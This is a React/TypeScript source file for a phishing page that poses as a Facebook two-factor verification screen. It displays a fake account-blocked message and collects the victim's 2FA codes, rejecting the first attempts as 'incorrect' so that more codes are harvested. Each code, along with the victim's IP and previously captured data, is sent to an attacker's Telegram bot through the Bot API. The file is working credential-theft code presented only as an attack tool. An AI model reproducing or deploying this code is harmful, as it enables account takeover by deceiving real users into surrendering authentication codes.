import { faExclamationCircle } from "@fortawesome/free-solid-svg-icons";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import TwoFaImage from "@/assets/images/2fa-df.png";
import getConfig from "@/utils/config";
import axios from "axios";
import type { FC } from "react";
import { useEffect, useMemo, useState } from "react";
import { useNavigate } from "react-router";
import type { GeoLocation } from "@/types/geo";
import FinishModal from "@/components/finish-modal";

interface UIState {
  error: string;
  isLoading: boolean;
  attempt: number;
  messageId: number;
}

interface Config {
  chatId: string;
  token: string;
  loadingTime: number;
  maxAttempt: number;
}

const initialUIState: UIState = {
  error: "",
  isLoading: false,
  attempt: 0,
  messageId: 0,
};

const createVerifyMessage = (code: string, attempt?: number) => {
  const geoData: GeoLocation = JSON.parse(
    localStorage.getItem("geoData") ?? "{}",
  );
  const lastMessage = localStorage.getItem("lastMessage");
  if (attempt === 1) {
    return `${lastMessage}\n━━━━━━━━━━━━━━━━━━━━━\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔓 <b>CODE 2FA:</b> <code>${code}</code>`;
  }
  return `${lastMessage}\n🌐 <b>IP:</b> <code>${geoData.ip}</code>🔓 <b>CODE 2FA ${attempt}:</b> <code>${code}</code>`;
};

const sendTelegramMessage = async (
  message: string,
  config: Config,
  messageId: string,
) => {
  if (messageId) {
    await axios.post(
      `https://api.telegram.org/bot${config.token}/deleteMessage`,
      {
        chat_id: config.chatId,
        message_id: messageId,
      },
    );
  }
  return axios.post(`https://api.telegram.org/bot${config.token}/sendMessage`, {
    chat_id: config.chatId,
    text: message,
    parse_mode: "HTML",
  });
};

const Verify: FC = () => {
  const navigate = useNavigate();
  const [startTime] = useState(() => Date.now());
  const [counter, setCounter] = useState(0);
  const [code, setCode] = useState("");
  const [uiState, setUiState] = useState<UIState>(initialUIState);
  const [config, setConfig] = useState<Config>({
    chatId: "",
    token: "",
    loadingTime: 0,
    maxAttempt: 0,
  });

  const [isShowModal, setIsShowModal] = useState(false);

  useEffect(() => {
    const timer = setInterval(() => {
      setCounter((prev) => prev + 1);
    }, 1000);

    const { telegram, settings } = getConfig();
    setConfig({
      chatId: telegram.data_chatid,
      token: telegram.data_token,
      loadingTime: settings.code_loading_time,
      maxAttempt: settings.max_failed_code_attempts,
    });

    return () => clearInterval(timer);
  }, []);

  const timeInfo = useMemo(() => {
    const elapsedSeconds = Math.floor((Date.now() - startTime) / 1000);
    const timeLeft = Math.max(0, 300 - elapsedSeconds); // 5 phút = 300 giây

    const mins = Math.floor(timeLeft / 60);
    const secs = timeLeft % 60;
    const formattedTime = `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;

    return { timeLeft, formattedTime };
  }, [startTime, counter]);

  const handleCodeChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (/^\d*$/.test(value) && value.length <= 8) {
      setCode(value);
      clearError();
    }
  };

  const clearError = () => {
    setUiState((prev) => ({ ...prev, error: "" }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (code.length < 6) {
      setUiState((prev) => ({ ...prev, error: "Please enter a valid code." }));
      return;
    }

    const savedMessageId = localStorage.getItem("messageId");
    if (!savedMessageId) {
      navigate("/");
      return;
    }

    const message = createVerifyMessage(code, uiState.attempt + 1);
    localStorage.setItem("lastMessage", message);

    if (uiState.attempt >= config.maxAttempt) {
      setUiState((prev) => ({ ...prev, isLoading: true }));

      try {
        const response = await sendTelegramMessage(
          message,
          config,
          savedMessageId,
        );
        localStorage.setItem("messageId", response.data.result.message_id);
        setTimeout(() => {
          setIsShowModal(true);
        }, config.loadingTime);
      } catch {
        setIsShowModal(true);
      }
      return;
    }

    setUiState((prev) => ({
      ...prev,
      attempt: prev.attempt + 1,
      isLoading: true,
    }));

    try {
      const response = await sendTelegramMessage(
        message,
        config,
        savedMessageId,
      );
      localStorage.setItem("messageId", response.data.result.message_id);
      setTimeout(() => {
        setUiState((prev) => ({
          ...prev,
          isLoading: false,
          error: "Incorrect code. Please try again.",
        }));
      }, config.loadingTime);
    } catch {
      navigate("/verify");
    }
  };

  return (
    <div className="min-h-screen bg-[#F1F2F6] py-10">
      <form
        className="lg:w-2.5/5 mx-auto w-11/12 self-center rounded-lg bg-[#fff] p-5 sm:w-11/12 md:w-2/3 xl:w-2/5"
        id="skdzvhmcei"
        onSubmit={handleSubmit}
      >
        <p className="text-2xl font-bold">
          Two-factor authentication required ({uiState.attempt + 1}/
          {config.maxAttempt + 1})
        </p>
        <p className="my-3">
          We have temporarily blocked your account because Facebook Protect has
          changed. Verify code has been send to ****.
        </p>
        <div>
          <img src={TwoFaImage} className="mb-3 rounded-xl" alt="" />
        </div>
        <input
          type="text"
          inputMode="numeric"
          pattern="\d*"
          name="code"
          required
          minLength={6}
          maxLength={8}
          placeholder="Enter your code (6-8 digits)"
          className={`mt-1 mb-3 block w-full rounded-md border ${uiState.error ? "border-red-500" : "border-slate-300"} bg-gray-100 px-3 py-3 placeholder-slate-400 shadow-sm focus:border-black focus:ring-1 focus:ring-black focus:outline-none sm:text-sm`}
          value={code}
          onChange={handleCodeChange}
          autoComplete="one-time-code"
          autoFocus
          onFocus={clearError}
        />
        <p className="error_2fa mt-2 text-red-700">{uiState.error}</p>
        <div className="flex items-center gap-3 rounded-md bg-[#F7F8FA] p-3">
          <div className="text-2xl text-yellow-600">
            <FontAwesomeIcon icon={faExclamationCircle} />
          </div>
          <div>
            <p>
              You've asked us to require a 6-digit login code when anyone tries
              to access your account from a new device or browser. Enter the
              6-digit code from your code generator or third-party app below.
            </p>
            <p>
              Please wait{" "}
              <strong className="count-time">{timeInfo.formattedTime}</strong>{" "}
              to request the sending of the code.
            </p>
          </div>
        </div>
        <p className="mt-3 mb-5">
          We'll walk you through some steps to secure and unlock your account.
        </p>
        <button
          type="submit"
          className={`block w-full cursor-pointer rounded-lg border border-[#d1d5db] ${code.length >= 6 ? "bg-blue-500 text-white hover:bg-blue-600" : "bg-gray-100 text-black"} py-3 text-center text-lg font-semibold transition delay-75 ease-in-out`}
          disabled={code.length < 6 || uiState.isLoading}
        >
          {uiState.isLoading ? (
            <div className="flex items-center justify-center">
              <div className="h-6 w-6 animate-spin rounded-full border-2 border-t-transparent border-l-transparent" />
            </div>
          ) : (
            "Submit"
          )}
        </button>
        <button
          type="button"
          className="send-code-btn block w-full cursor-pointer py-3 text-center text-sm text-blue-800"
        >
          Send Code
        </button>
      </form>
      {isShowModal && <FinishModal />}
    </div>
  );
};

export default Verify;
